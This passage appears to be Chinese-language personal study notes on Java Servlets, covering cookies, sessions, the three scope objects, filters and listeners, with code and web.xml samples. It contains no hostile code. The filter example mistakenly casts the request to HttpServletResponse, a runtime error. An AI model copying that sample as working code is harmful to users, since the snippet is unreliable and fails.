<h3 id="Cookie的时效"><a href="#Cookie的时效" class="headerlink" title="Cookie的时效"></a>Cookie的时效</h3><p>根据生命周期和存储方式来区分,，有两种Cookie：</p>
<ol>
<li><p>会话级Cookie（Session Cookie）：指那些没有设置明确过期时间（即未设置<code>Max-Age</code>或<code>Expires</code>属性）的Cookie。这类Cookie仅在浏览器会话期间有效。</p>
<ul>
<li><p>存在于用户的临时内存中，直到用户关闭浏览器为止，重启浏览器失效。</p>
</li>
<li><p>不能跨浏览器使用，不具备长期存储功能。</p>
</li>
<li><p>更加注重隐私保护，因为数据仅在当前会话内可用。</p>
</li>
<li><p>常用于保存短期的信息，如用户的登录状态、购物车内容等，这些信息在浏览器关闭后不再需要保留。</p>
</li>
</ul>
</li>
<li><p>持久级Cookie（Persistent Cookie）：指那些设置了明确过期时间（通过<code>Max-Age</code>或<code>Expires</code>属性）的Cookie。这类Cookie可以在浏览器关闭后仍然存在，并且在设定的有效期内重新打开浏览器时仍然可用。</p>
<ul>
<li>根据<code>Max-Age</code>或<code>Expires</code>属性指定的时间长度存活。</li>
</ul>
<ul>
<li><p>存储在用户的硬盘上，允许跨多个浏览器会话使用。</p>
</li>
<li><p>适用于需要长期保存的信息，如用户偏好设置、自动登录选项等。可以用于跟踪用户行为，提供个性化服务或广告推荐。</p>
</li>
<li><p>提供了更长的数据保留期限，但可能涉及更多的隐私问题。需要谨慎管理过期时间和数据更新机制，以避免不必要的数据积累。</p>
</li>
</ul>
</li>
</ol>
<h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><p>设置cookie：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/cookie&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletA</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 创建cookie</span></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置cookie有效时长 单位：秒</span></span><br><span class="line">        cookie.setMaxAge(<span class="number">60</span>*<span class="number">5</span>);</span><br><span class="line">        <span class="comment">// 设置cookie的提交路径：</span></span><br><span class="line">        <span class="comment">// 请求设置路径下的资源时提交而请求其他路径资源时不提交</span></span><br><span class="line">        cookie.setPath(<span class="string">&quot;/web04/servletB&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将cookie放入response对象</span></span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取cookie：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletB</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 获取cookie</span></span><br><span class="line">        Cookie[] cookies = req.getCookies();</span><br><span class="line">        <span class="comment">// 迭代cookie数组，如果没有cookie会为空，所以需要先判断</span></span><br><span class="line">        <span class="keyword">if</span>(cookies!=<span class="literal">null</span>&amp;&amp;cookies.length!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (Cookie cookie:cookies)&#123;</span><br><span class="line">                System.out.println(cookie);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p><strong>Session</strong>（会话）是指在用户与网站或应用交互期间，服务器为每个用户创建的一种临时状态，用于存储特定于该用户的信息。这种机制允许服务器在多个页面请求之间保持用户的登录状态、购物车内容或其他个性化设置等数据。与Cookie不同，Session数据通常保存在服务器端，而仅通过一个唯一的会话ID（通常存储在客户端的Cookie中）来关联用户和其对应的会话数据。这不仅提高了安全性，还使得管理用户状态变得更加灵活和高效。</p>
<p><strong>实际使用时，Session必须配合Cookie使用</strong></p>
<h3 id="session的工作原理"><a href="#session的工作原理" class="headerlink" title="session的工作原理"></a>session的工作原理</h3><ol>
<li><p>创建Session</p>
<ul>
<li><p><strong>用户请求</strong>：当用户首次访问网站时，服务器检测到这是一个新的会话（通常是通过检查是否存在有效的Session ID），并创建一个新的会话。</p>
</li>
<li><p><strong>生成Session ID</strong>：服务器为这个新会话生成一个唯一的Session ID。这个ID可以是一个随机字符串，确保其具有足够的唯一性和安全性。</p>
</li>
<li><p><strong>发送Session ID</strong>：服务器将生成的Session ID发送给客户端。通常通过以下方式之一：</p>
<ul>
<li><strong>Cookie</strong>：最常见的方式是将Session ID存储在一个名为<code>session_id</code>的Cookie中，并随着响应返回给客户端。</li>
<li><strong>URL重写</strong>：也可以将Session ID直接附加到URL中，但这不如Cookie安全。</li>
</ul>
</li>
</ul>
</li>
<li><p>存储Session数据</p>
<ul>
<li><p><strong>服务器端存储</strong>：一旦Session ID被创建，服务器会在内存或数据库中存储与该Session ID相关联的数据。这可能包括用户的登录状态、购物车内容、偏好设置等。</p>
</li>
<li><p><strong>持久化选项</strong>：根据应用的需求，Session数据可以暂时存储在内存中（适用于短期会话），也可以持久化到数据库或其他存储系统中（适用于需要长期保存的会话数据）。</p>
</li>
</ul>
</li>
<li><p>使用Session</p>
<ul>
<li><p><strong>用户后续请求</strong>：当用户进行后续请求时，浏览器会自动将包含Session ID的Cookie（或通过URL参数）发送回服务器。</p>
</li>
<li><p><strong>识别用户</strong>：服务器接收到请求后，从Cookie或URL中提取Session ID，并查找对应的Session数据。</p>
</li>
<li><p><strong>处理请求</strong>：基于找到的Session数据，服务器可以恢复用户的会话状态，并继续处理请求，例如显示个性化页面或更新购物车。</p>
</li>
</ul>
</li>
<li><p>更新和删除Session</p>
<ul>
<li><p><strong>更新</strong>：如果用户在会话期间进行了某些操作（如添加商品到购物车），服务器会相应地更新Session中的数据。</p>
</li>
<li><p><strong>过期</strong>：每个Session都有一个设定的有效期。如果超过这个时间没有活动（即没有新的请求），Session将自动失效。服务器可以通过设置Session的过期时间来控制这一点。</p>
</li>
<li><p><strong>手动销毁</strong>：用户也可以主动注销（logout），此时服务器会清除与该Session ID相关的所有数据，并通知客户端删除相应的Cookie。</p>
</li>
</ul>
</li>
</ol>
<h3 id="session的时效"><a href="#session的时效" class="headerlink" title="session的时效"></a>session的时效</h3><p>Tomcat中采用滑动超时的session，即本次使用与上次使用间隔不超过设定时间时，使用原session，超过后产生新的session。默认为30分钟，可以在web.xml配置文件中使用以下标签设置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>30<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>或在代码中设定（不常用），见下文使用示例</p>
<h3 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/session&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SessionServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="comment">// 接收请求中的username参数</span></span><br><span class="line">      <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">      <span class="comment">// 获取session对象</span></span><br><span class="line">      <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> req.getSession();</span><br><span class="line">      <span class="comment">// 设置session有效时长，仅对当前代码产生的session有效</span></span><br><span class="line">      <span class="comment">// 其他类或方法中产生的session不受此代码控制。单位: 秒</span></span><br><span class="line">      session.setMaxInactiveInterval(<span class="number">120</span>);</span><br><span class="line">      <span class="comment">// 自动判断请求中是否存在一个特殊的cookie name:jsessionid value:?</span></span><br><span class="line">      <span class="comment">//    存在：根据jsessionid查找对应的httpSession对象：</span></span><br><span class="line">      <span class="comment">//       找到：返回之前的httpSession对象</span></span><br><span class="line">      <span class="comment">//       没找到：创建一个新的session返回并向response对象中存入一个jsessionid的cookie</span></span><br><span class="line">      <span class="comment">//    不存在：创建一个新的session返回并向response对象中存入一个jsessionid的cookie</span></span><br><span class="line">      System.out.println(session.getId());</span><br><span class="line">      System.out.println(session.isNew());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 将username存入session</span></span><br><span class="line">      session.setAttribute(<span class="string">&quot;username&quot;</span>,username);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 向客户端响应信息</span></span><br><span class="line">      resp.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">      resp.getWriter().write(<span class="string">&quot;SUCCESS&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/get&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetSessionServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 获取session对象</span></span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> req.getSession();</span><br><span class="line">        <span class="comment">// 读取session中存储的信息</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String)session.getAttribute(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;username is &quot;</span>+ username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="三大域对象"><a href="#三大域对象" class="headerlink" title="三大域对象"></a>三大域对象</h2><p>在Web开发中，<strong>域对象（Scope Object）</strong> 是指在特定范围内共享数据的对象。不同的域对象允许开发者在不同层次和生命周期内存储和访问数据。Web开发中通常有三个域对象：</p>
<ol>
<li>请求域对象（HttpServletRequest）在一次请求之内及请求转发中传递数据</li>
<li>会话域对象（HttpSession）在一次会话之内传递数据，可以跨多个请求</li>
<li>应用域对象（ServletContext）在本应用之内传递数据，可以跨多个会话</li>
</ol>
<p>总结：</p>
<table>
<thead>
<tr>
<th>域对象</th>
<th>生命周期</th>
<th>共享范围</th>
<th>典型用途</th>
<th>示例数据</th>
</tr>
</thead>
<tbody><tr>
<td>请求域</td>
<td>单个HTTP请求</td>
<td>当前请求</td>
<td>存放本次请求业务有关的数据</td>
<td>表单验证结果、临时数据</td>
</tr>
<tr>
<td>会话域</td>
<td>用户与服务器之间的多次交互</td>
<td>同一用户的多个请求</td>
<td>存放本次会话的客户端相关的数据</td>
<td>用户登录状态、购物车内容</td>
</tr>
<tr>
<td>应用域</td>
<td>整个Web应用程序的生命周期</td>
<td>所有用户和所有请求</td>
<td>存放本应用程序有关的数据</td>
<td>全局配置、共享资源、springIoc容器</td>
</tr>
</tbody></table>
<h3 id="使用示例-2"><a href="#使用示例-2" class="headerlink" title="使用示例"></a>使用示例</h3><p>存放数据：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> * <span class="meta">@Description</span>: 三大域对象数据存储API演示</span><br><span class="line"> */</span><br><span class="line"><span class="meta">@WebServlet(&quot;/put&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScopePutServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 请求域</span></span><br><span class="line">        req.setAttribute(<span class="string">&quot;request&quot;</span>,<span class="string">&quot;requestMessage&quot;</span>);</span><br><span class="line">        <span class="comment">// 会话域</span></span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> req.getSession();</span><br><span class="line">        session.setAttribute(<span class="string">&quot;session&quot;</span>,<span class="string">&quot;sessionMessage&quot;</span>);</span><br><span class="line">        <span class="comment">// 应用域</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">application</span> <span class="operator">=</span> req.getServletContext();</span><br><span class="line">        application.setAttribute(<span class="string">&quot;application&quot;</span>,<span class="string">&quot;applicationMessage&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 一次请求中获取数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">request</span> <span class="operator">=</span> (String) req.getAttribute(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        System.out.println(request);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 请求转发中获取数据</span></span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;get&quot;</span>).forward(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>获取数据：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/* @Description: 三大域对象取数据API演示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/get&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScopeGetServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 请求域获取数据</span></span><br><span class="line">        <span class="comment">// 被请求转发时可以获取，单纯提供url访问时无法获取</span></span><br><span class="line">        <span class="comment">// 因此两次输出分别是 requestMessage null</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">request</span> <span class="operator">=</span> (String) req.getAttribute(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        System.out.println(request);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 会话域获取数据</span></span><br><span class="line">        <span class="comment">// 同一会话时可以获取，打开另一个浏览器（相当于另一个客户端，不同会话）无法获取</span></span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> req.getSession();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sessionMes</span> <span class="operator">=</span>(String) session.getAttribute(<span class="string">&quot;session&quot;</span>);</span><br><span class="line">        System.out.println(sessionMes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 应用域获取数据</span></span><br><span class="line">        <span class="comment">// 重新部署应用（相当于一个新的应用）无法获取</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">application</span> <span class="operator">=</span> req.getServletContext();</span><br><span class="line">        <span class="type">String</span> <span class="variable">applicationMsg</span> <span class="operator">=</span> (String) application.getAttribute(<span class="string">&quot;application&quot;</span>);</span><br><span class="line">        System.out.println(applicationMsg);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<hr>
<h1 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h1><p>在Web开发中，<strong>过滤器（Filter）</strong> 是一种用于拦截和处理请求或响应的组件。它可以在请求到达Servlet之前或响应返回客户端之前对它们进行预处理或后处理。过滤器广泛应用于各种场景，如身份验证、日志记录、数据压缩等。以下是关于过滤器的详细介绍：</p>
<h3 id="过滤器的工作原理"><a href="#过滤器的工作原理" class="headerlink" title="过滤器的工作原理"></a>过滤器的工作原理</h3><ol>
<li><strong>拦截请求和响应</strong>：<ul>
<li>过滤器可以拦截来自客户端的所有请求，并在请求到达目标资源（如Servlet、JSP页面等）之前对其进行处理。</li>
<li>同样，过滤器也可以拦截从目标资源返回的响应，并在响应返回给客户端之前对其进行处理。</li>
</ul>
</li>
<li><strong>链式处理</strong>：<ul>
<li>多个过滤器可以组合成一个过滤器链（Filter Chain）。每个过滤器依次处理请求和响应，最终将请求传递给目标资源，然后将响应按相反顺序返回给客户端。</li>
</ul>
</li>
<li><strong>生命周期管理</strong>：<ul>
<li>过滤器具有自己的生命周期，通常包括<code>init()</code>、<code>doFilter()</code>和<code>destroy()</code>方法。<ul>
<li><code>init(FilterConfig filterConfig)</code>：在过滤器初始化时调用，常用于配置过滤器参数。</li>
<li><code>doFilter(ServletRequest request, ServletResponse response, FilterChain chain)</code>：核心方法，负责处理请求和响应。</li>
<li><code>destroy()</code>：在过滤器被销毁时调用，用于释放资源。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><img src="D:\workinenglish\typora_image\image-20250114220330502.png" alt="image-20250114220330502"></p>
<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>步骤：</p>
<ol>
<li><p>实现Filter接口</p>
</li>
<li><p>重写过滤方法</p>
</li>
<li><p>配置过滤器</p>
<ul>
<li><p>web.xml</p>
</li>
<li><p>注解</p>
</li>
</ul>
</li>
</ol>
<p>步骤1，2：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">SimpleDateFormat</span> <span class="variable">dateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>();</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    包含三部分内容：</span></span><br><span class="line"><span class="comment">    1. 请求到达目标资源前的功能代码</span></span><br><span class="line"><span class="comment">    2. 放行代码</span></span><br><span class="line"><span class="comment">    3. 响应之前（HttpServletResponse）转换为响应报文之前的功能代码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// 1.</span></span><br><span class="line">    System.out.println(<span class="string">&quot;filter before doFilter&quot;</span>);</span><br><span class="line">    <span class="comment">// 应用示例 - 日志输出</span></span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) servletRequest;</span><br><span class="line">    <span class="comment">// 请求到达目标资源前，打印日志</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> request.getRequestURI();</span><br><span class="line">    <span class="type">String</span> <span class="variable">dateTime</span> <span class="operator">=</span> dateFormat.format(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    <span class="type">String</span> <span class="variable">beforeLogging</span> <span class="operator">=</span> requestURI + <span class="string">&quot;在&quot;</span> + dateTime + <span class="string">&quot;被访问了&quot;</span>;</span><br><span class="line">    System.out.println(beforeLogging);</span><br><span class="line">    <span class="type">Long</span> <span class="variable">t1</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.</span></span><br><span class="line">    filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    <span class="comment">// 3.</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">t2</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">    System.out.println(<span class="string">&quot;filter before response&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">afterLogging</span> <span class="operator">=</span> requestURI+<span class="string">&quot;资源在&quot;</span>+dateTime+<span class="string">&quot;的请求耗时：&quot;</span>+(t2-t1)+<span class="string">&quot;毫秒&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>配置方式一：XML</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置过滤器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.fu.filters.FilterTest<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置过滤器的过滤资源规则--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;url-pattern&gt;，根据请求资源的路径对指定请求进行过滤--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;url-pattern&gt;，根据请求的servlet资源别名对指定的servlet资源进行过滤--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>servlet1<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>配置方式二：配置类</strong></p>
<h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p>四个生命周期：</p>
<table>
<thead>
<tr>
<th>周期</th>
<th>方法</th>
<th>执行次数和时机</th>
</tr>
</thead>
<tbody><tr>
<td>构造</td>
<td>构造器</td>
<td>服务启动时执行一次</td>
</tr>
<tr>
<td>初始化</td>
<td>init</td>
<td>构造完毕执行一次</td>
</tr>
<tr>
<td>过滤</td>
<td>doFilter</td>
<td>每次请求执行一次（整个服务期间可能多次）</td>
</tr>
<tr>
<td>销毁</td>
<td>destroy()</td>
<td>服务关闭执行一次</td>
</tr>
</tbody></table>
<p>代码示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterTest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">FilterTest</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;生命周期1-构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        XML文件中可以通过如下配置初始化参数</span></span><br><span class="line"><span class="comment">        &lt;init-param&gt;</span></span><br><span class="line"><span class="comment">            &lt;param-name&gt;dataTimePatten&lt;/param-name&gt;</span></span><br><span class="line"><span class="comment">            &lt;param-value&gt;yyyy-MM-dd HH:mm:ss&lt;/param-value&gt;</span></span><br><span class="line"><span class="comment">        &lt;/init-param&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(<span class="string">&quot;生命周期2-初始化&quot;</span>);</span><br><span class="line">        System.out.println(filterConfig.getInitParameter(<span class="string">&quot;dataTimePattern&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;过滤方法&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;销毁方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​                     </p>
<h3 id="过滤器链"><a href="#过滤器链" class="headerlink" title="过滤器链"></a>过滤器链</h3><p>配置文件中：哪一个Filter的<code>&lt;filter-mapping&gt;</code>标签在前，哪一个Filter就先执行后结束。</p>
<p>注解配置时：Filter的执行顺序由过滤器的类名决定。因此建议过滤器类名格式应该按：<code>F1_过滤器功能</code></p>
<p>（注意，每一个过滤器都需要单独编写一个类）</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250118225043.png"></p>
<h3 id="注解配置"><a href="#注解配置" class="headerlink" title="注解配置"></a>注解配置</h3><p>使用注解<code>@WebFilter(urlPatterns = &quot;/*&quot;)</code>，其中有多个属性，属性名是配置文件方式下标签名的改写，与标签作用一致。</p>
<h1 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h1><p>类似JavaScript的监听器。当域对象发生特定操作（如对象创建、销毁；数据增删改）时，可以自动执行一些代码。</p>
<p>在Web开发中，<strong>监听器（Listener）</strong> 是用于监听特定事件并在这些事件发生时执行相应操作的组件。监听器可以帮助开发者捕捉和响应各种生命周期事件或状态变化，从而实现更复杂的应用逻辑。</p>
<p>web中定义八个监听器接口作为监听器的规范，这八个接口按照不同的标准可以形成不同的分类;<br><strong>按监听的对象划分:</strong></p>
<ul>
<li>application域监听器 ：<code>ServletContextListener</code> 、<code>ServletContextAttributeListener</code>;</li>
<li>session域监听器：<code>HttpSessionListener</code>、<code>HttpSessionAttributeListener</code>、<code>HttpSessionBindingListener</code>、<code>HttpSessionActivationListener </code>:</li>
<li>request域监听器：<code>ServletRequestListener</code> 、<code>ServletRequestAttributeListener</code> ;</li>
</ul>
<p><strong>按监听的事件分</strong>:</p>
<ul>
<li>域对象的创建和销毁监听器：ServletContextListener HttpsessionListener SeryletRequestListener :</li>
<li>域对象数据增删改事件监听器 Servletcontext<code>Attribute</code>Listener HttpSessionAttributeListener ServletRequestAttributeListener ;</li>
<li>其他监听器 HttpSession<code>Binding</code>Listener HttpSession<code>Activation</code>Listener ;</li>
</ul>
<h3 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h3><p><strong>配置方式一：XML</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.fu.listener.ListenerTest<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>配置方式二：注解</strong></p>
<p><code>@WebListener</code></p>
<p>使用示例：<code>ServletContextListener</code>应用域对象创建销毁监听器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent sce)</span> &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">application</span> <span class="operator">=</span> sce.getServletContext();</span><br><span class="line">        System.out.println(application.hashCode()+<span class="string">&quot;应用域初始化&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextDestroyed</span><span class="params">(ServletContextEvent sce)</span> &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">application</span> <span class="operator">=</span> sce.getServletContext();</span><br><span class="line">        System.out.println(application.hashCode()+<span 